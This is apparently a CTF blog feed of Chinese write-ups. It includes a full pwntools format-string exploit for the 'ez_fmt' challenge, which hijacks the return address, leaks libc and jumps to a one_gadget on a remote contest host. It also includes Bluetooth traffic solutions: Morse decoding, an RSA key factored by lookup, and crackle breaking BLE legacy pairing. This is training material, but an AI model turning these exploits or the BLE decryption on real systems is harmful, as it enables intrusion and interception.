tNt6qLo%2BmlBasagWqffqp%2B0qFg%2BagkHu1d8/UEhOapAw3qtWd6iQ5c0kXRYeGfGJwJjkURuHTOMPxnN6anxqrp47GqKSU8DVjuCGnSbG%2BsMTygEMaaV/EfFhh/rJPckMLVuBvOjO49KsW6AoVkIji8ICEuDVQZE1o99p2hgTU7q91i/c0zdzYz8u%2BzVNo/A3znyPUrHO68mU47TzfD8s2tMGJW7%2BYHAnkR0D%2BD1f82tmchEtJmbt2bHBkEhNyU/MtFZ/h2LzeVBWdFXmDTRQVSunO5R7HkwwkH5Ao9PyhmfvO1N0aspxpKRykS1fv8GryvNwNm/z02x9mYt0HKPZVHMpsfrGomRXfV8%2BKQR5Jj%2BRExJJ4rD3CZpeOdwtCYY7cxHeWMNPdt8/8Y0CXMC0zKltpwF8D5jjVoqdMbaCxLkXlWxBiPUOTfIDKAOtd798t%2BDsvjV8fR6yCID3L4s1BV8%2B5/c6Oarc/1oh%2Bj65PbzeWJjrJHa4Ve18S0S/HZECA%2BhV6X37HW69TFSVGpJwes%2Bj0PM4Gj0MwHiE1WgVGzHk3oyQG015mTJkvgz0V8nQpA6%2BFHqHalh2YCR2gYJxLIBzVI/7iMzdQZVdsbZsPnLE9StlQfymRE1725udSzL%2BP8MXy5pyEJDHOLnhSamNywH0C8NaS/gwsziqwg3WyHH8pgJJ2iwPE/G6SjhWTO5f84iO10kAFeAo%2B0pbRSgxR4w04pflggZ6bVPJOP0VfmkalUVfI7ACsmPuiWSzA3ORRlKPOSDGAZR7/6t0trA/WiCS1fj9PoirpojrwWBj9EiAZstv2k7YeVk9T1qn4zXShqzpVlJA8H04AIThB5tMDVJb9CPZ%2Be3OAxmoF3ACWJaHNOz7U1TAgb25mvvYlL0VvuCAzEinFtW/exXt8aYeO0i4BAEmRLemzJSRNxl4100u3lqvGOgUvi8L%2BBOEh8X3fZnEgpbH8PFVrX%2BerZFH%2BXr3NavkhwJVJTAj0xt7c4V6V14iHLrItQSOtR0dSL8KY0pn9xFsAqIUehfjFOW6mGq8ZIAnbGopoqHGBNGfJj5QTMBsSG2WaxE4aBSIW7QiFy7E/5mHB23MM%2BKOLwXAHJIVU7eCdt/Cbvz412fZN0vL2et8hqlVXysZ4s4U6WHoMtm%2B6F7VpNB69NNgsmwoefLfOF3KF/ROsWgcee%2BJtHQ73SF9gG6tBV%2BcnkQa4FySWUVhGA9Sj3P2YBszCc01icoT1GoA3qtoAisVgzpLK00BjwNGfM3jrYdfFB4RK0aoapH1FNW8dS6bJ1UPWDUOj5Xfm0ucrqD0jxUdGbZrplg0M%2BgX4l9kIMXCwGfhaY%2Bo5IqAmmLaKvROgNo6n5DsgwEApK13o7k8EikxEbgw/Q5CFH28bpD/g6r3/jp0jlV65T2QgJx2ThzNNPntbd9oOZMcv4gJN%2BYSQ0tP4mKLyO15SbQVI1X0ND2aDqnhKv8Vw0mydEZMQOZUe11NERYJ7cAGBkL8gbNLNKcG6m1ZExBD/jp8ezd1a4rkaxY3S9zrHBJ80GnS%2BG%2BsqtYEVJ5MjvPIII9qJtoOk%2BWl1sF9XcBm/PI2HvZv/KHovD/3dr1OdLu6Dqf6EnJhfA92UwDj/VOAwGYxtt2l7gNeJ4lhT8mWm4jJe2UKW8nhGOeOgfhpPCkr7pt6GS8s%2Bubgx0lqrzM2f2Py9t5riRRGIXNROLBRWQvyn/42Kme8ql6%2B67fTliyxwY42E7OS1QEdtA6/Ys/HJWs9QZ7RMDGNtBY3%2BLwGy5NV92DzVPmycKCB4LhvRt1zfv1WVM/uWEYmqq5SVSbmR8AMW5lTT2WHMfnEhXj5leW17j/aQg5wmFX5kl8NTodyZ7OtesXKnP1dNIp%2BnJMhnm0dOqr/cK4XvbcoHcnAurnySVjAAO/tP3wRcp2K4IArX7QCkbLr92eFaX0TP%2BvVjmwYM9JTXNyBcfUu%2BcLIWGrUfQ0nQ0VeSgn0w96usmb6vXrDByWEKwfgl5dsUPBPKEttmPFAulPQpbs0ikCWRh23QYM9nr3aB66PNeHoE%2BjKQsQTUhVQUoJ9J7pukRyldlT//JxZylrKZcfYrgJtPDtjE%2BBFRq%2BbUjifVHeX2ejJW%2BvQJmsdAKOjdPzxKpjv/8D37LNEIImgnWWx14YoavYHTKfZn6Y%2BbSLuwEbgMnftSBqCPefltedjci87iGmMUsjnzBwRUVQtsaMeFtiREiGp8eyfHjiON1iV8SZUjxc62Y5zzVlwf0geBTpISiJ4QbwMmdfXRPSBWAxUGs/ukuI1mZZzTq3n%2BESl7Z09UE5sHAOBQnZTV4jsxI3Mh3cnXg%2BbUUGibNa4uI/211zUWvZr0mScnwj0GRbc%2B5QZF5ZnAE5D33nyhNy8iAemQhBYaJQSzJgs8tcMLgi7igehuAN79gHPHfLteDrJlXPAXMnGgsMKxxoXaR9RE7S2ak1lDSdDxVcb6VwU2/You47Huy/Bk/aQS48I%2BK6L795qpdwoeL6Gf2A/3Qv86eKjAZNxquVez6lFzmncLLWEl2WGH4zR47IeZzATtY%2BnCkoYyqyeJyVK6a67oUAzB0Pf1tXrZ%2BXZGMsZmHocQdABbrxLaSh7zVCeklSaGAf3qYlQolE9kd7AOdEq7eOyyNZSZQRnGvTHsIx%2BvU1MIt62jGB5Gou9cwz7zcAjPrm9OqUMR3IIgj8qZdFjzzJ8oUcHifK1BOaB7lo2TmCZchd9yrm%2BikNFTAAAAAAAAAAAIF37vXZVAAAAAP6mHjYAAAEAAAAAAAAAoDI46WZ/</a></p><h3 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h3><p>gift会泄露栈顶地址，动调可以算出ret参数的地址</p><p>格式化字符串漏洞任意地址写，可以劫持返回地址，利用printf函数泄露libc地址</p><p>给了libc文件，直接尝试打one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>r=remote(<span class="hljs-string">&#x27;47.104.24.40&#x27;</span>,<span class="hljs-number">1337</span>)<br><span class="hljs-comment">#r=process(&#x27;./ez_fmt&#x27;)</span><br>elf=ELF(<span class="hljs-string">&quot;./ez_fmt&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>r.recvuntil(<span class="hljs-string">b&#x27;There is a gift for you &#x27;</span>)<br>stack_rsp=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#-----calc addr</span><br>stack_printf_ret = stack_rsp - <span class="hljs-number">0x8</span><br>stack_ret = stack_rsp + <span class="hljs-number">0x78</span><br>stack_printf = stack_rsp + <span class="hljs-number">0x158</span><br>success(<span class="hljs-string">&#x27;stack_rsp: %s&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_rsp))<br>success(<span class="hljs-string">&#x27;stack_ret: %s&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_ret))<br>success(<span class="hljs-string">&#x27;stack_printf: %s&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_printf))<br><br>ogg1 = <span class="hljs-number">0xe3afe</span><br>ogg2 = <span class="hljs-number">0xe3b01</span><br>ogg3 = <span class="hljs-number">0xe3b04</span><br><br>stack_printf_ret_addr = stack_printf_ret &amp; <span class="hljs-number">0xffff</span><br>success(<span class="hljs-string">&#x27;stack_printf_ret_addr %s&#x27;</span>,<span class="hljs-built_in">hex</span>(stack_printf_ret_addr))<br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#-----hijack ret_addr&amp;&amp;leak libc_base</span><br>payload=<span class="hljs-string">b&#x27;%19$p&#x27;</span><br>payload+=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0x1205</span>-<span class="hljs-number">6</span>-<span class="hljs-number">8</span>).encode()+<span class="hljs-string">b&#x27;c%10$hn&#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload+=p64(stack_printf_ret)<br>r.send(payload)<br><br>r.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br><br>libc_base=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xf3</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>one=libc_base+ogg2<br>one1=one&amp;<span class="hljs-number">0xffff</span><br>one2=(one&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span><br>success(<span class="hljs-string">&#x27;libc_base: %s&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><br>payload=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(one2).encode()+<span class="hljs-string">b&#x27;c%10$hn&#x27;</span><br>payload+=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(one1-one2).encode()+<span class="hljs-string">b&#x27;c%11$hn&#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload+=p64(stack_ret-<span class="hljs-number">0x10</span>+<span class="hljs-number">2</span>)+p64(stack_ret-<span class="hljs-number">0x10</span>)<br>r.send(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>强网杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Teslaaaaa</title>
    <link href="/2023/11/27/2020%E7%BD%91%E9%BC%8E%E6%9D%AFTeslaaaaa/"/>
    <url>/2023/11/27/2020%E7%BD%91%E9%BC%8E%E6%9D%AFTeslaaaaa/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/Teslaaaaa/1.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些蓝牙流量分析</title>
    <link href="/2023/11/26/%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F/"/>
    <url>/2023/11/26/%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="2023数字中国·数据安全产业人才能力挑战赛初赛"><a href="#2023数字中国·数据安全产业人才能力挑战赛初赛" class="headerlink" title="2023数字中国·数据安全产业人才能力挑战赛初赛"></a>2023数字中国·数据安全产业人才能力挑战赛初赛</h2><h3 id="Are-you-ok"><a href="#Are-you-ok" class="headerlink" title="Are you ok"></a>Are you ok</h3><p>题目给了一个日志文件，打开是乱码，但根据其中的明文<code>HUAWEI P10 Plus</code>和<code>Mi Smart Band 5</code>猜测是蓝牙流量，用Wireshark打开。<br>大概过程是刚开始两台设备进行了认证通信，然后互相发送了一些信息，实在看不懂蓝牙流量😒<br>在这里我们直接根据<code>info</code>排序，发现Handle为<code>0x0026</code>的通信最长，符合flag的特征<br><img src="/mdimg/Bluetooth/1.png"><br>通过观察发现，Opcode的Value有<code>0x00</code>，<code>0x01</code>，<code>0x02</code>三种，猜测是莫斯编码</p><table><thead><tr><th align="center">Value</th><th align="center">0x00</th><th align="center">0x01</th><th align="center">0x02</th></tr></thead><tbody><tr><td align="center">Morse</td><td align="center">.</td><td align="center">-</td><td align="center">/</td></tr></tbody></table><p>写脚本将所有通信过程打印出来，并转化为Morse电码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br>pcap = pyshark.FileCapture(<span class="hljs-string">&#x27;1.pcap&#x27;</span>, display_filter = <span class="hljs-string">&#x27;btatt.opcode == 0x52&#x27;</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> pcap:<br>    opcode = <span class="hljs-built_in">str</span>(pkt.btatt.value)<br>    <span class="hljs-keyword">if</span> opcode == <span class="hljs-string">&#x27;00&#x27;</span>:<br>        flag += <span class="hljs-string">&#x27;.&#x27;</span><br>    <span class="hljs-keyword">elif</span> opcode == <span class="hljs-string">&#x27;01&#x27;</span>:<br>        flag += <span class="hljs-string">&#x27;-&#x27;</span><br>    <span class="hljs-keyword">elif</span> opcode == <span class="hljs-string">&#x27;02&#x27;</span>:<br>        flag += <span class="hljs-string">&#x27;/&#x27;</span><br><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># .../--../--../--./...-/--/./...../-----</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/Bluetooth/2.png"></p><h2 id="Cyber-Apocalypse-2021"><a href="#Cyber-Apocalypse-2021" class="headerlink" title="Cyber Apocalypse 2021"></a>Cyber Apocalypse 2021</h2><h3 id="Low-Energy-Crypto"><a href="#Low-Energy-Crypto" class="headerlink" title="Low Energy Crypto"></a>Low Energy Crypto</h3><p>直接根据<code>info</code>排序，发现Handle为<code>0x0016</code>的通信中有一个RSA的公钥<br><img src="/mdimg/Bluetooth/3.png"><br>将公钥导出</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">-----BEGIN <span class="hljs-keyword">PUBLIC</span> <span class="hljs-keyword">KEY</span>-----<br>MGowDQYJKoZIhvcNAQEBBQADWQAwVgJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0m<br>B9fjj4tlGekPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/<span class="hljs-number">3L</span>i<br><span class="hljs-number">4l</span>+RI2g0FqJvf3ff<br>-----<span class="hljs-keyword">END</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-keyword">KEY</span>-----<br></code></pre></td></tr></table></figure><p>用openssl转换一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(g0at㉿kali)-[~/桌面]<br>└─$ openssl rsa -<span class="hljs-keyword">in</span> 2.key -text -inform PEM -pubin<br>Public-Key: (512 bit)<br>Modulus:<br>    00:a2:8f:1f:19:e6:91:65:42:e1:f8:de:ec:a3:1b:<br>    59:97:f4:ef:34:75:d0:3d:26:07:d7:e3:8f:8b:65:<br>    1a:43:ce:5b:e7:<span class="hljs-built_in">fc</span>:24:6c:e0:60:94:56:6e:87:a4:<br>    72:76:5f:89:0a:cb:46:10:37:44:49:f5:95:42:a4:<br>    44:09:d4:a8:09<br>Exponent:<br>    00:cb:ff:72:e2:e2:5f:91:23:68:34:16:a2:6f:7f:<br>    77:<span class="hljs-built_in">df</span><br>writing RSA key<br>-----BEGIN PUBLIC KEY-----<br>MGowDQYJKoZIhvcNAQEBBQADWQAwVgJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0m<br>B9fjj4tlGkPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/3Li<br>4l+RI2g0FqJvf3ff<br>-----END PUBLIC KEY-----<br></code></pre></td></tr></table></figure><p>往下看，在Handle为<code>0x0014</code>的通信中发现密文<br><img src="/mdimg/Bluetooth/4.png"><br><img src="/mdimg/Bluetooth/5.png"><br>切换为原始存储，手动去掉0即可密文c<br><img src="/mdimg/Bluetooth/6.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">00:a2:8f:1f:19:e6:91:65:42:e1:f8:de:ec:a3:1b:</span><br><span class="hljs-string">59:97:f4:ef:34:75:d0:3d:26:07:d7:e3:8f:8b:65:</span><br><span class="hljs-string">1a:43:ce:5b:e7:fc:24:6c:e0:60:94:56:6e:87:a4:</span><br><span class="hljs-string">72:76:5f:89:0a:cb:46:10:37:44:49:f5:95:42:a4:</span><br><span class="hljs-string">44:09:d4:a8:09</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>m=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">00:cb:ff:72:e2:e2:5f:91:23:68:34:16:a2:6f:7f:</span><br><span class="hljs-string">77:df</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>x=<span class="hljs-string">&quot;392969b018ffa093b9ab5e45ba86b4aa070e78b839abf11377e783626d7f9c4091392aef8e13ae9a22844288e2d27f63d2ebd0fb90871016fde87077d50ae538&quot;</span><br><br>n = s.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>e = m.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>n = <span class="hljs-built_in">int</span>(n, <span class="hljs-number">16</span>)<br>e = <span class="hljs-built_in">int</span>(e, <span class="hljs-number">16</span>)<br>c = <span class="hljs-built_in">int</span>(x, <span class="hljs-number">16</span>)<br><br><span class="hljs-comment">#factorDB分解一下n</span><br>p = <span class="hljs-number">92270847179792937622745249326651258492889546364106258880217519938223418249279</span><br>q = <span class="hljs-number">92270847179792937622745249326651258492889546364106258880217519938223418258871</span><br><br><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>phi_n=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=libnum.invmod(e,phi_n)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-comment">#print(m)</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#CHTB&#123;5p34k_fr13nd_4nd_3n73r&#125;</span><br></code></pre></td></tr></table></figure><h2 id="CVVD-2022智能网联汽车漏洞挖掘赛"><a href="#CVVD-2022智能网联汽车漏洞挖掘赛" class="headerlink" title="CVVD 2022智能网联汽车漏洞挖掘赛"></a>CVVD 2022智能网联汽车漏洞挖掘赛</h2><h3 id="蓝牙钥匙的春天"><a href="#蓝牙钥匙的春天" class="headerlink" title="蓝牙钥匙的春天"></a>蓝牙钥匙的春天</h3><p>一个蓝牙流量包，随便翻翻发现存在 SMP 协议，全称是 Secure Manager Protocol，是蓝牙用来定义配对和密钥分发的，具体可以看这篇文章<a href="http://t.csdnimg.cn/VMihl">http://t.csdnimg.cn/VMihl</a></p><p>另外可以注意到这里使用了BlUETOOTH_LE_LL帧。</p><p><img src="/mdimg/Bluetooth/7.png"></p><p>由于配对后的流量是被加密的，所以这里看不到他们传输了什么信息，但是有个工具 crackle 是可以解密这种数据包的，这个工具解密蓝牙流量有三个前提，这也在官方的 FAQ 中提到了：<br><a href="https://github.com/mikeryan/crackle/blob/master/FAQ.md">https://github.com/mikeryan/crackle/blob/master/FAQ.md</a></p><p>When should I use Crackle?</p><p>Crackle is useful when you have sniffed a BLE connection that uses Link Layer encryption and LE Legacy pairing. Before attempting to use Crackle, it’s worth asking the following questions:</p><ol><li>Can I log the data without having to sniff it at all?</li><li>If not, is my device actually using Link Layer encryption?</li><li>Is the device using Legacy Pairing or LE Secure Connections?</li></ol><p>If the answers to these questions are “no”, “yes”, and “legacy pairing”, Crackle is the right tool for the job.</p><p>翻译一下就是：使用链路层加密和 LE Legacy 配对的 BLE 连接时，Crackle 非常有用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/arunima06/crackle.git<br><br><span class="hljs-built_in">cd</span> crackle<br><br>sudo apt-get install libpcap-dev<br><br>make<br><br>sudo make install<br></code></pre></td></tr></table></figure><p>使用添加了BlUETOOTH_LE_LL帧支持的老哥的工具解密流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">g0at@Ubuntu22:~/桌面$ crackle -i uploads_2022_04_11_h5kAcZEg_ble.pcapng -o de.pcapng<br>PCAP contains [BLUETOOTH_LE_LL] frames<br>Found 1 connection<br><br>Analyzing connection 0:<br>  7e:6f:08:2a:8d:36 (random) -&gt; 34:15:13:87:bf:e9 (public)<br>  Found 51 encrypted packets<br>  Cracking with strategy 0, 20 bits of entropy<br><br>  !!!<br>  TK found: 000000<br>  ding ding ding, using a TK of 0! Just Cracks(tm)<br>  !!!<br><br>  Decrypted 51 packets<br>  LTK found: 34f4bcd107ad8f6833acf01059719d8b<br><br>Decrypted 51 packets, dumping to PCAP<br>Done, processed 1494 total packets, decrypted 51<br></code></pre></td></tr></table></figure><p>再打开解密后的流量包，可以看到Handle为<code>0x0012</code>处已经有数据</p><p><img src="/mdimg/Bluetooth/8.png"></p><p>拿到赛博厨子的魔术棒显示，解两次Hex就是字符串，另外发现Value有一些重复</p><p><img src="/mdimg/Bluetooth/9.png"></p><p>然后就是基于GPT的exp构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">import pyshark<br><br>pcap = pyshark.FileCapture(<span class="hljs-string">&#x27;de.pcapng&#x27;</span>, display_filter=<span class="hljs-string">&#x27;btatt.opcode == 0x52&#x27;</span>, tshark_path=<span class="hljs-string">&#x27;D:/Wireshark/tshark&#x27;</span>)<br><br>values = []<br><br><span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> pcap:<br>    <span class="hljs-keyword">if</span> hasattr(pkt, <span class="hljs-string">&#x27;btatt&#x27;</span>) and hasattr(pkt.btatt, <span class="hljs-string">&#x27;value&#x27;</span>):<br>        <span class="hljs-comment"># 去掉冒号</span><br>        value_without_colon = pkt.btatt.value.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-comment"># 在每个value后面加上换行符</span><br>        value_with_newline = value_without_colon + <span class="hljs-string">&#x27;\n&#x27;</span><br>        values.append(value_with_newline)<br><br><span class="hljs-comment"># 使用set去除重复的value，然后再转换回list</span><br>values = list(<span class="hljs-built_in">set</span>(values))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(values))<br><br><span class="hljs-comment"># 对每个value单独解两次hex编码</span><br><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> values:<br>    decoded_value = bytes.fromhex(value).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    final_decoded_value = bytes.fromhex(decoded_value).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(final_decoded_value)<br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">3337333333363335333236333330363536353330</span><br><span class="hljs-string">3636364336313637374233393632363133333339</span><br><span class="hljs-string">33343334333136323634333433303744</span><br><span class="hljs-string">3633333733363633363133363633363233333336</span><br><span class="hljs-string"></span><br><span class="hljs-string">73652c0ee0</span><br><span class="hljs-string">c76ca6cb36</span><br><span class="hljs-string">flag&#123;9ba39</span><br><span class="hljs-string">441bd40&#125;</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment">#flag&#123;9ba3973652c0ee0c76ca6cb36441bd40&#125;</span><br><span class="hljs-comment">#flag&#123;9ba39c76ca6cb3673652c0ee0441bd40&#125;</span><br></code></pre></td></tr></table></figure><h2 id="2023数字中国·数据安全产业人才能力挑战赛决赛"><a href="#2023数字中国·数据安全产业人才能力挑战赛决赛" class="headerlink" title="2023数字中国·数据安全产业人才能力挑战赛决赛"></a>2023数字中国·数据安全产业人才能力挑战赛决赛</h2><h3 id="AreYouOK-Pro"><a href="#AreYouOK-Pro" class="headerlink" title="AreYouOK Pro"></a>AreYouOK Pro</h3><p>仍然是给了一个日志文件，用wireshark打开，简单过一遍应该是尼康相机向HUAWEI P30 Pro发送了一个文件，这里用了RFCOMM协议<a href="http://t.csdnimg.cn/Kbzsl">【蓝牙RFCOMM 协议】-CSDN博客</a></p><p>往下看，从932帧开始有数据在传输，</p><p><img src="/mdimg/Bluetooth/10.png"></p><p>在964帧，确定为传输的是一张jpg图片</p><p><img src="/mdimg/Bluetooth/11.png"></p><p>看到了jpg的文件头，所以图片从968帧开始传输</p><p><img src="/mdimg/Bluetooth/12.png"></p><p>观察Data数据发现，后面的长度均为680（猜测这是单个数据块最大值）在jpg文件头前还有一段数据，猜测传输过程是将文件分块传输，每块前均有固定的传输标识符，翻看Data数据，在下面也多次发现<code>a5a50100</code>这段数据，<code>_ws.col.protocol == &quot;RFCOMM&quot;</code>筛选出RFCOMM传输数据的过程，导出分组为json文件。</p><p><img src="/mdimg/Bluetooth/13.jpg"></p><p><img 